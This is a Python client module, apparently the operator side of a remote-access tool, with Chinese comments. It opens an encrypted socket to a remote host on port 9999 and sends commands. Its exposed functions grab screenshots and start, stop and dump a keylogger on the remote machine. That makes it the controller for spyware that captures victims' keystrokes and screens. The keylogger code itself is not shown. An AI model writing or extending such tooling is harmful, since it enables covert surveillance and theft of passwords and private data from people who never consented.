# client/core.py
import socket
import json
import time

import sys
import os
# 将项目根目录添加到PATH
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))


from remote_control.utils.crypto import CryptoHandler
from remote_control.utils.network import SecureSocket



class EnhancedClient:
    def __init__(self):
        self.sock = None
        self.secure_socket = None
        self.crypto = CryptoHandler()

    def connect(self, host, port=9999):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((host, port))
            self.secure_socket = SecureSocket(self.sock, self.crypto)
            return True
        except Exception as e:
            print(f"连接服务器失败: {e}")
            return False

    def disconnect(self):
        if self.sock:
            try:
                self.sock.close()
            except:
                pass

    def send_command(self, cmd_type, params=None):
        if not self.secure_socket:
            return {'status': 'failed', 'error': '未连接到服务器'}

        command = {
            'type': cmd_type,
            **(params or {})
        }

        try:
            if not self.secure_socket.send(command):
                return {'status': 'failed', 'error': '发送命令失败'}

            response = self.secure_socket.receive()
            if response is None:
                return {'status': 'failed', 'error': '接收响应失败'}

            return response
        except Exception as e:
            print(f"发送命令时出错: {e}")
            return {'status': 'failed', 'error': str(e)}

    def get_screenshot(self):
        response = self.send_command('screenshot')
        if response.get('status') == 'success':
            return response.get('data')
        return None

    def control_keylogger(self, action):
        valid_actions = {'start', 'stop', 'dump'}
        if action not in valid_actions:
            return {'status': 'failed', 'error': '无效的操作'}

        command_type = f'keylogger_{action}'
        return self.send_command(command_type)